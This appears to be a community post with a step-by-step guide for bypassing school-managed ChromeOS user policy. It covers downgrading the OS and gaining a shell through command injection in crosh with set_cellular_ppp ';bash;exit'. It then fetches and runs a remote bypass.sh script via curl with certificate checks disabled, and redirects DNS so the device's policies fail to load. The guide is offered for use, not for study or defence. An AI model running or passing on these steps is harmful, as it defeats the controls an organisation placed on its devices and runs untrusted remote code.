**UserPolicy Bypass**

finally (credit to @SprinkzMC for tipping me off about the flag)

You need: The ability to downgrade to a version below 102 A way to access crosh. If it's blocked via extension, use LTBEEF. If it's blocked by user policy, you must use a combination of Incognito Exploit (v81) and Crosh Bypass (Daybreak) A router or hotspot capable of either blocking websites via parental control or setting a custom DNS (129.213.58.41)

Steps: Downgrade to a version below 102 YOU HAVE TO DOWNGRADE! IF YOU DON'T DOWNGRADE AND ASK FOR HELP WE WILL LAUGH AT YOU!!!!!!!!!!!!!! Open crosh (ctrl+alt+t) Elevate to a chronos shell by typing in set_cellular_ppp ';bash;exit' Run the command sh <(curl -k https://coolelectronics.me/bypass.sh) & disown Remove your school account, log out or just clear it in any way you can. The method varies depending on how device policy is set up In your router settings, set the dns to 129.213.58.41 or block m.google.com. (NOT THE NETWORK DNS ON THE CHROMEBOOK, IT WONT WORK) #deleted-channel or DNS Sinkhole + Hotspot on iOS can be used Log into your school account

It should prompt you about a PIN and google play, and then drop you into an account where everything works as normal but no user policies are set. If you get a "sign in required" error, try steps again

This should enable ARC (playstore) and unblock all policy blocked urls When you connect to a wifi without the custom DNS the policy will reload to normal but some changes will persist, more testing is needed
